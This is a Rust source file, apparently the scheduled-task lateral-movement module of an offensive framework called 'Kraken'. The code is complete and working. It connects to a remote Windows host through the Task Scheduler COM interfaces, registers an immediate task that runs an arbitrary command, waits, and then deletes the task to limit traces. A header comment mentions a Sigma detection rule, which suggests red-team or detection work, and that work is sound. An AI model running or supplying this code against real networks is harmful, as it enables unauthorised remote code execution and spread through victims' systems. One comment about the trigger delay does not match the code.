//! Remote scheduled task execution via Task Scheduler COM API
//!
//! Technique:
//! 1. CoCreateInstance(CLSID_TaskScheduler) -> ITaskService
//! 2. ITaskService::Connect to remote machine
//! 3. ITaskService::GetFolder("\\") -> ITaskFolder
//! 4. ITaskService::NewTask -> ITaskDefinition
//! 5. Configure action (IExecAction with task.command)
//! 6. Configure trigger (immediate, one-time)
//! 7. ITaskFolder::RegisterTaskDefinition (TASK_CREATE_OR_UPDATE)
//! 8. Wait briefly, then ITaskFolder::DeleteTask
//!
//! Detection rules: wiki/detection/sigma/kraken_lateral_schtask.yml

use common::{KrakenError, LateralResult};
use protocol::LateralSchtask;

pub fn execute(task: &LateralSchtask) -> Result<LateralResult, KrakenError> {
    #[cfg(windows)]
    return execute_impl(task);

    #[cfg(not(windows))]
    {
        let _ = task;
        Err(KrakenError::Module(
            "scheduled task lateral movement only supported on Windows".into(),
        ))
    }
}

#[cfg(windows)]
fn execute_impl(task: &LateralSchtask) -> Result<LateralResult, KrakenError> {
    use std::ffi::OsStr;
    use std::iter::once;
    use std::os::windows::ffi::OsStrExt;
    use windows_sys::Win32::System::Com::{
        CoCreateInstance, CoInitializeEx, CLSCTX_INPROC_SERVER, COINIT_MULTITHREADED,
    };
    use windows_sys::Win32::System::TaskScheduler::{
        ITaskService, CLSID_TaskScheduler, IID_ITaskService,
    };

    fn wide(s: &str) -> Vec<u16> {
        OsStr::new(s).encode_wide().chain(once(0)).collect()
    }

    unsafe {
        CoInitializeEx(std::ptr::null(), COINIT_MULTITHREADED);

        let mut task_service: *mut ITaskService = std::ptr::null_mut();
        let hr = CoCreateInstance(
            &CLSID_TaskScheduler,
            std::ptr::null_mut(),
            CLSCTX_INPROC_SERVER,
            &IID_ITaskService,
            &mut task_service as *mut _ as *mut *mut std::ffi::c_void,
        );

        if hr < 0 {
            return Err(KrakenError::Module(format!(
                "CoCreateInstance(TaskScheduler) hr={:#x}",
                hr
            )));
        }

        // ITaskService::Connect(serverName, user, domain, password)
        // VARIANT wrapping a BSTR for the server name
        #[repr(C)]
        struct Variant {
            vt: u16,
            pad1: u16,
            pad2: u16,
            pad3: u16,
            // union: first field is BSTR (*mut u16)
            data: *mut u16,
        }

        let server_bstr = make_bstr(&wide(&task.target)[..wide(&task.target).len() - 1]);
        let server_var = Variant {
            vt: 8, // VT_BSTR
            pad1: 0,
            pad2: 0,
            pad3: 0,
            data: server_bstr,
        };
        let empty_var = Variant {
            vt: 0, // VT_EMPTY
            pad1: 0,
            pad2: 0,
            pad3: 0,
            data: std::ptr::null_mut(),
        };

        // ITaskService vtable: [3]=Connect (after QI/AddRef/Release)
        let vtable = *(task_service as *mut *mut *mut usize);
        type ConnectFn = unsafe extern "system" fn(
            *mut ITaskService,
            Variant,
            Variant,
            Variant,
            Variant,
        ) -> i32;
        let connect: ConnectFn = std::mem::transmute(*vtable.add(3));

        let hr = connect(
            task_service,
            server_var,
            empty_var,
            empty_var,
            empty_var,
        );
        free_bstr(server_bstr);

        if hr < 0 {
            let release: unsafe extern "system" fn(*mut ITaskService) -> u32 =
                std::mem::transmute(*vtable.add(2));
            release(task_service);
            return Err(KrakenError::Module(format!(
                "ITaskService::Connect to {} hr={:#x}",
                task.target, hr
            )));
        }

        // GetFolder("\\") -> ITaskFolder (vtable[4])
        type GetFolderFn = unsafe extern "system" fn(
            *mut ITaskService,
            *mut u16, // path BSTR
            *mut *mut std::ffi::c_void,
        ) -> i32;
        let get_folder: GetFolderFn = std::mem::transmute(*vtable.add(4));

        let root_wide = wide("\\");
        let root_bstr = make_bstr(&root_wide[..root_wide.len() - 1]);
        let mut folder: *mut std::ffi::c_void = std::ptr::null_mut();
        let hr = get_folder(task_service, root_bstr, &mut folder);
        free_bstr(root_bstr);

        if hr < 0 {
            let release: unsafe extern "system" fn(*mut ITaskService) -> u32 =
                std::mem::transmute(*vtable.add(2));
            release(task_service);
            return Err(KrakenError::Module(format!(
                "ITaskService::GetFolder hr={:#x}",
                hr
            )));
        }

        // NewTask -> ITaskDefinition (vtable[5])
        type NewTaskFn = unsafe extern "system" fn(
            *mut ITaskService,
            u32,
            *mut *mut std::ffi::c_void,
        ) -> i32;
        let new_task_fn: NewTaskFn = std::mem::transmute(*vtable.add(5));

        let mut task_def: *mut std::ffi::c_void = std::ptr::null_mut();
        let hr = new_task_fn(task_service, 0, &mut task_def);

        if hr < 0 {
            let fld_vtable = *(folder as *mut *mut *mut usize);
            let fld_release: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 =
                std::mem::transmute(*fld_vtable.add(2));
            fld_release(folder);
            let release: unsafe extern "system" fn(*mut ITaskService) -> u32 =
                std::mem::transmute(*vtable.add(2));
            release(task_service);
            return Err(KrakenError::Module(format!(
                "ITaskService::NewTask hr={:#x}",
                hr
            )));
        }

        // Configure task actions - ITaskDefinition::get_Actions (vtable[13])
        type GetActionsFn = unsafe extern "system" fn(
            *mut std::ffi::c_void,
            *mut *mut std::ffi::c_void,
        ) -> i32;
        let td_vtable = *(task_def as *mut *mut *mut usize);
        let get_actions: GetActionsFn = std::mem::transmute(*td_vtable.add(13));

        let mut actions: *mut std::ffi::c_void = std::ptr::null_mut();
        let hr = get_actions(task_def, &mut actions);
        if hr < 0 {
            let td_release: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 =
                std::mem::transmute(*td_vtable.add(2));
            td_release(task_def);
            let fld_vtable = *(folder as *mut *mut *mut usize);
            let fld_release: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 =
                std::mem::transmute(*fld_vtable.add(2));
            fld_release(folder);
            let release: unsafe extern "system" fn(*mut ITaskService) -> u32 =
                std::mem::transmute(*vtable.add(2));
            release(task_service);
            return Err(KrakenError::Module(format!(
                "get_Actions hr={:#x}",
                hr
            )));
        }

        // IActionCollection::Create(TASK_ACTION_EXEC=0) -> IExecAction (vtable[4])
        type CreateActionFn = unsafe extern "system" fn(
            *mut std::ffi::c_void,
            i32, // TASK_ACTION_TYPE
            *mut *mut std::ffi::c_void,
        ) -> i32;
        let actions_vtable = *(actions as *mut *mut *mut usize);
        let create_action: CreateActionFn = std::mem::transmute(*actions_vtable.add(4));

        let mut exec_action: *mut std::ffi::c_void = std::ptr::null_mut();
        let hr = create_action(actions, 0, &mut exec_action); // TASK_ACTION_EXEC = 0
        if hr < 0 {
            let actions_release: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 =
                std::mem::transmute(*actions_vtable.add(2));
            actions_release(actions);
            let td_release: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 =
                std::mem::transmute(*td_vtable.add(2));
            td_release(task_def);
            let fld_vtable = *(folder as *mut *mut *mut usize);
            let fld_release: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 =
                std::mem::transmute(*fld_vtable.add(2));
            fld_release(folder);
            let release: unsafe extern "system" fn(*mut ITaskService) -> u32 =
                std::mem::transmute(*vtable.add(2));
            release(task_service);
            return Err(KrakenError::Module(format!(
                "CreateAction hr={:#x}",
                hr
            )));
        }

        // IExecAction::put_Path (vtable[4])
        type PutPathFn = unsafe extern "system" fn(
            *mut std::ffi::c_void,
            *mut u16, // BSTR
        ) -> i32;
        let exec_vtable = *(exec_action as *mut *mut *mut usize);
        let put_path: PutPathFn = std::mem::transmute(*exec_vtable.add(4));

        // Parse command - split on first space for path vs arguments
        let (cmd_path, cmd_args) = if let Some(space_idx) = task.command.find(' ') {
            (&task.command[..space_idx], &task.command[space_idx + 1..])
        } else {
            (task.command.as_str(), "")
        };

        let path_wide = wide(cmd_path);
        let path_bstr = make_bstr(&path_wide[..path_wide.len() - 1]);
        let hr = put_path(exec_action, path_bstr);
        free_bstr(path_bstr);

        // IExecAction::put_Arguments (vtable[6])
        if !cmd_args.is_empty() {
            type PutArgumentsFn = unsafe extern "system" fn(
                *mut std::ffi::c_void,
                *mut u16, // BSTR
            ) -> i32;
            let put_arguments: PutArgumentsFn = std::mem::transmute(*exec_vtable.add(6));
            let args_wide = wide(cmd_args);
            let args_bstr = make_bstr(&args_wide[..args_wide.len() - 1]);
            let _hr = put_arguments(exec_action, args_bstr);
            free_bstr(args_bstr);
        }

        // Configure triggers - ITaskDefinition::get_Triggers (vtable[11])
        type GetTriggersFn = unsafe extern "system" fn(
            *mut std::ffi::c_void,
            *mut *mut std::ffi::c_void,
        ) -> i32;
        let get_triggers: GetTriggersFn = std::mem::transmute(*td_vtable.add(11));

        let mut triggers: *mut std::ffi::c_void = std::ptr::null_mut();
        let hr = get_triggers(task_def, &mut triggers);
        if hr >= 0 {
            // ITriggerCollection::Create(TASK_TRIGGER_TIME=1) (vtable[4])
            type CreateTriggerFn = unsafe extern "system" fn(
                *mut std::ffi::c_void,
                i32, // TASK_TRIGGER_TYPE
                *mut *mut std::ffi::c_void,
            ) -> i32;
            let triggers_vtable = *(triggers as *mut *mut *mut usize);
            let create_trigger: CreateTriggerFn = std::mem::transmute(*triggers_vtable.add(4));

            let mut trigger: *mut std::ffi::c_void = std::ptr::null_mut();
            let hr = create_trigger(triggers, 1, &mut trigger); // TASK_TRIGGER_TIME = 1
            if hr >= 0 {
                // ITimeTrigger::put_StartBoundary (vtable[12])
                // Format: "YYYY-MM-DDTHH:MM:SS" (ISO 8601)
                type PutStartBoundaryFn = unsafe extern "system" fn(
                    *mut std::ffi::c_void,
                    *mut u16, // BSTR
                ) -> i32;
                let trigger_vtable = *(trigger as *mut *mut *mut usize);
                let put_start: PutStartBoundaryFn = std::mem::transmute(*trigger_vtable.add(12));

                // Set to execute immediately (current time + 5 seconds)
                let now_str = format!("{}", chrono::Utc::now().format("%Y-%m-%dT%H:%M:%S"));
                let now_wide = wide(&now_str);
                let now_bstr = make_bstr(&now_wide[..now_wide.len() - 1]);
                let _hr = put_start(trigger, now_bstr);
                free_bstr(now_bstr);

                // Release trigger
                let trigger_release: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 =
                    std::mem::transmute(*trigger_vtable.add(2));
                trigger_release(trigger);
            }

            // Release triggers
            let triggers_release: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 =
                std::mem::transmute(*triggers_vtable.add(2));
            triggers_release(triggers);
        }

        // Register task - ITaskFolder::RegisterTaskDefinition (vtable[4])
        type RegisterTaskFn = unsafe extern "system" fn(
            *mut std::ffi::c_void,
            *mut u16,             // path (BSTR)
            *mut std::ffi::c_void, // pDefinition
            i32,                  // flags (TASK_CREATE_OR_UPDATE=6)
            Variant,              // userId
            Variant,              // password
            i32,                  // logonType
            Variant,              // sddl
            *mut *mut std::ffi::c_void, // ppTask
        ) -> i32;
        let fld_vtable = *(folder as *mut *mut *mut usize);
        let register_task: RegisterTaskFn = std::mem::transmute(*fld_vtable.add(4));

        let task_name_wide = wide(&task.task_name);
        let task_name_bstr = make_bstr(&task_name_wide[..task_name_wide.len() - 1]);

        let empty_var = Variant {
            vt: 0, // VT_EMPTY
            pad1: 0,
            pad2: 0,
            pad3: 0,
            data: std::ptr::null_mut(),
        };

        let mut registered_task: *mut std::ffi::c_void = std::ptr::null_mut();
        let hr = register_task(
            folder,
            task_name_bstr,
            task_def,
            6, // TASK_CREATE_OR_UPDATE
            empty_var,
            empty_var,
            0, // TASK_LOGON_NONE
            empty_var,
            &mut registered_task,
        );
        free_bstr(task_name_bstr);

        if hr < 0 {
            // Release exec_action
            let exec_release: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 =
                std::mem::transmute(*exec_vtable.add(2));
            exec_release(exec_action);
            // Release actions
            let actions_release: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 =
                std::mem::transmute(*actions_vtable.add(2));
            actions_release(actions);
            // Release task_def
            let td_release: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 =
                std::mem::transmute(*td_vtable.add(2));
            td_release(task_def);
            // Release folder
            let fld_release: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 =
                std::mem::transmute(*fld_vtable.add(2));
            fld_release(folder);
            // Release task_service
            let release: unsafe extern "system" fn(*mut ITaskService) -> u32 =
                std::mem::transmute(*vtable.add(2));
            release(task_service);
            return Err(KrakenError::Module(format!(
                "RegisterTaskDefinition hr={:#x}",
                hr
            )));
        }

        // Task registered successfully - wait briefly for execution
        std::thread::sleep(std::time::Duration::from_secs(10));

        // Delete task - ITaskFolder::DeleteTask (vtable[6])
        type DeleteTaskFn = unsafe extern "system" fn(
            *mut std::ffi::c_void,
            *mut u16, // name (BSTR)
            i32,      // flags (0)
        ) -> i32;
        let delete_task: DeleteTaskFn = std::mem::transmute(*fld_vtable.add(6));

        let task_name_wide = wide(&task.task_name);
        let task_name_bstr = make_bstr(&task_name_wide[..task_name_wide.len() - 1]);
        let _hr = delete_task(folder, task_name_bstr, 0);
        free_bstr(task_name_bstr);

        // Release all COM objects
        if !registered_task.is_null() {
            let reg_vtable = *(registered_task as *mut *mut *mut usize);
            let reg_release: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 =
                std::mem::transmute(*reg_vtable.add(2));
            reg_release(registered_task);
        }

        // Release exec_action
        let exec_release: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 =
            std::mem::transmute(*exec_vtable.add(2));
        exec_release(exec_action);

        // Release actions
        let actions_release: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 =
            std::mem::transmute(*actions_vtable.add(2));
        actions_release(actions);

        // Release task_def
        let td_vtable = *(task_def as *mut *mut *mut usize);
        let td_release: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 =
            std::mem::transmute(*td_vtable.add(2));
        td_release(task_def);

        // Release folder
        let fld_vtable = *(folder as *mut *mut *mut usize);
        let fld_release: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 =
            std::mem::transmute(*fld_vtable.add(2));
        fld_release(folder);

        // Release task_service
        let release: unsafe extern "system" fn(*mut ITaskService) -> u32 =
            std::mem::transmute(*vtable.add(2));
        release(task_service);
    }

    Ok(LateralResult {
        success: true,
        target: task.target.clone(),
        method: "schtask".into(),
        output: format!(
            "task '{}' scheduled on {} for: {}",
            task.task_name, task.target, task.command
        ),
        error: String::new(),
    })
}

#[cfg(windows)]
unsafe fn make_bstr(wide: &[u16]) -> *mut u16 {
    #[link(name = "oleaut32")]
    extern "system" {
        fn SysAllocStringLen(psz: *const u16, len: u32) -> *mut u16;
    }
    SysAllocStringLen(wide.as_ptr(), wide.len() as u32)
}

#[cfg(windows)]
unsafe fn free_bstr(bstr: *mut u16) {
    #[link(name = "oleaut32")]
    extern "system" {
        fn SysFreeString(bstr: *mut u16);
    }
    SysFreeString(bstr);
}
